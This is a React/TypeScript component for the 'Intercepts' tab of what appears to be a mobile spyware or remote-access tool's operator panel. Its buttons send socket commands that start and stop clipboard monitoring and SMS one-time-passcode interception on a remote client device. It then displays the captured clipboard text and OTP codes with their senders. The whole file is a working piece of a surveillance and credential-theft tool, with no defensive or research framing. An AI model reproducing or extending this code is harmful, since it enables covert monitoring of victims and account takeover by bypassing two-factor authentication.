
import { ClipboardList, Clipboard, KeyRound, Play, Square } from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'

// Intercepts tab — Clipboard monitor + OTP interceptor. Both run as live
// streams on the device (start_clipboard / start_otp) and we surface the
// incoming events here.
export function InterceptsTab({ clientId }: { clientId: string }) {
  const clipboard = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.clipboard ?? [],
  )
  const otp = useAppSelector((s) => s.exploit.byClient[clientId]?.otp ?? [])

  return (
    <div className="space-y-5">
      <div className="flex items-center gap-2">
        <ClipboardList className="h-4 w-4 text-emerald-400" />
        <h3 className="text-sm font-semibold text-zinc-100">Intercepts</h3>
        <span className="inline-flex items-center gap-1 rounded bg-emerald-500/15 px-1.5 py-0.5 text-[10px] font-medium text-emerald-300 ring-1 ring-emerald-500/30">
          <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 pulse-emerald" />
          Live
        </span>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Clipboard */}
        <div className="rounded-xl border border-white/10 bg-black/30 overflow-hidden flex flex-col">
          <div className="flex items-center justify-between bg-zinc-900/60 px-3 py-2 border-b border-white/10">
            <div className="flex items-center gap-2 text-xs uppercase tracking-wider text-zinc-400">
              <Clipboard className="h-3.5 w-3.5 text-emerald-400/80" />
              Clipboard
            </div>
            <div className="flex gap-1">
              <Button
                size="sm"
                onClick={() => emitOrder(clientId, 'start_clipboard')}
                className="h-7 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
              >
                <Play className="h-3 w-3" /> Start
              </Button>
              <Button
                size="sm"
                variant="outline"
                onClick={() => emitOrder(clientId, 'stop_clipboard')}
                className="h-7 bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
              >
                <Square className="h-3 w-3" /> Stop
              </Button>
            </div>
          </div>
          <div className="max-h-72 overflow-y-auto scrollbar-emerald divide-y divide-white/5 p-1">
            {clipboard.length === 0 ? (
              <div className="px-3 py-8 text-center text-xs text-zinc-600">
                Clipboard not active. Tap Start to begin intercepting.
              </div>
            ) : (
              clipboard.map((c, i) => (
                <div
                  key={i}
                  className="rounded px-2 py-1.5 text-xs hover:bg-white/[0.03]"
                >
                  <div className="text-[10px] text-zinc-500 mb-0.5">{c.time}</div>
                  <div className="text-zinc-200 font-mono break-all">
                    {c.content}
                  </div>
                </div>
              ))
            )}
          </div>
        </div>

        {/* OTP */}
        <div className="rounded-xl border border-white/10 bg-black/30 overflow-hidden flex flex-col">
          <div className="flex items-center justify-between bg-zinc-900/60 px-3 py-2 border-b border-white/10">
            <div className="flex items-center gap-2 text-xs uppercase tracking-wider text-zinc-400">
              <KeyRound className="h-3.5 w-3.5 text-emerald-400/80" />
              OTP
            </div>
            <div className="flex gap-1">
              <Button
                size="sm"
                onClick={() => emitOrder(clientId, 'start_otp')}
                className="h-7 bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950"
              >
                <Play className="h-3 w-3" /> Start
              </Button>
              <Button
                size="sm"
                variant="outline"
                onClick={() => emitOrder(clientId, 'stop_otp')}
                className="h-7 bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
              >
                <Square className="h-3 w-3" /> Stop
              </Button>
            </div>
          </div>
          <div className="max-h-72 overflow-y-auto scrollbar-emerald divide-y divide-white/5 p-1">
            {otp.length === 0 ? (
              <div className="px-3 py-8 text-center text-xs text-zinc-600">
                OTP interceptor not active. Tap Start to begin.
              </div>
            ) : (
              otp.map((o, i) => (
                <div
                  key={i}
                  className="rounded px-2 py-1.5 hover:bg-white/[0.03]"
                >
                  <div className="flex items-center justify-between gap-2 mb-1">
                    <span className="text-[10px] text-zinc-500 truncate">
                      {o.sender}
                    </span>
                    <span className="text-[10px] text-zinc-600 shrink-0">
                      {o.time}
                    </span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Badge className="px-2 py-0.5 font-mono text-sm tracking-wider bg-emerald-500/20 text-emerald-300 ring-1 ring-emerald-500/40">
                      {o.otp}
                    </Badge>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      <p className="text-[11px] text-zinc-600">
        Intercepts SMS OTP codes and clipboard contents in realtime.
      </p>
    </div>
  )
}
